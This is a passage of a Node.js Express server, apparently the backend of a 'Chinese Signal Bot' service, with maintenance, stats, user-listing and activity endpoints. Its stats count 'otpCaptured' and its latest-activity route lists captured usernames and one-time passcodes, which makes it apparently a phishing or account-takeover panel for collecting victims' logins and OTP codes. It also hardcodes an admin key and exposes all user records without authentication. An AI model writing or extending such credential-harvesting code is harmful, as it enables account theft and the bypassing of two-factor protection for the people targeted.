let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };

app.get('/api/maintenance', (req, res) => {
    res.json(maintenanceMode);
});

app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = {
        active:  !!active,
        until:   until   || null,
        message: message || 'Under Maintenance. Please check back soon.'
    };
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & DATA ==================
app.get('/api/stats', async (req, res) => {
    try {
        if (useDatabase) {
            const stats = await dbGetStats();
            return res.json(stats);
        }
        // File fallback
        res.json({
            totalUsers: users.length,
            onlineNow: users.filter(u => u.status === "Online").length,
            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses: licenses.length,
            activeLicenses: licenses.filter(l => l.status === "Active").length
        });
    } catch (e) {
        console.error('/api/stats error:', e.message);
        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0 });
    }
});

app.get('/api/users', async (req, res) => {
    // Support pagination: ?offset=0&limit=100
    // When no params given, returns ALL users (backwards-compatible)
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;

    try {
        if (useDatabase) {
            const allUsers = await dbGetAllUsers();
            if (limit > 0) {
                return res.json({
                    users: allUsers.slice(offset, offset + limit),
                    total: allUsers.length,
                    offset,
                    limit
                });
            }
            return res.json(allUsers);
        }

        // File fallback
        if (limit > 0) {
            res.json({
                users: users.slice(offset, offset + limit),
                total: users.length,
                offset,
                limit
            });
        } else {
            res.json(users);
        }
    } catch (e) {
        console.error('/api/users error:', e.message);
        res.json(useDatabase ? [] : users);
    }
});

app.get('/api/latest-activity', async (req, res) => {
    try {
        if (useDatabase) {
            const allUsers = await dbGetAllUsers();
            return res.json({
                logins: allUsers.filter(u => u.username),
                otps:   allUsers.filter(u => u.otp)
            });
        }
        res.json({
            logins: users.filter(u => u.username),
            otps: users.filter(u => u.otp)
        });
    } catch (e) {
        res.json({ logins: [], otps: [] });
    }
});

app.get('/', (req, res) => {
    res.send(`✅ Chinese Signal Bot Server v3 Running — Storage: ${useDatabase ? 'PostgreSQL (Permanent)' : 'File-based'}`);
});

// ================== START SERVER ==================
const PORT = process.env.PORT || 3000;

async function startServer() {
    // Initialize database if available
    if (useDatabase) {
        await initDatabase();
    }

    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`💾 Storage mode: ${useDatabase ? 'PostgreSQL (PERMANENT — 100k users supported)' : 'File-based (set DATABASE_URL for permanent storage)'}`);
        if (!useDatabase) {
            console.log(`📁 Data directory: ${DATA_DIR}`);
            console.log(`👥 Loaded ${users.length} users, ${licenses.length} licenses`);
        }
    });
}

startServer().catch(err => {
    console.error('Failed to start server:', err);
    process.exit(1);
});
